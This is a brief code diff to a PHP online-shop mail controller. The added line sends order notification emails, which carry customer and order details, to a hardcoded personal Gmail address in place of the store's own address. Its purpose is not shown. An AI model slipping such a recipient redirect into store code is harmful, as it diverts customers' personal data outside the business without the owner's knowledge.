@@ -510,6 +510,7 @@ class ControllerMailOrder extends Controller {
 
 			//$mail->setTo($this->config->get('config_email'));
 			$mail->setTo("creme21-versand@freiheit-gruppe.de");
+			$mail->setTo("vukynamkhtn@gmail.com");
 			$mail->setFrom($this->config->get('config_email'));
 			$mail->setSender(html_entity_decode($order_info['store_name'], ENT_QUOTES, 'UTF-8'));
 			$mail->setSubject(html_entity_decode(sprintf($this->language->get('text_subject'), $this->config->get('config_name'), $order_info['order_id']), ENT_QUOTES, 'UTF-8'));
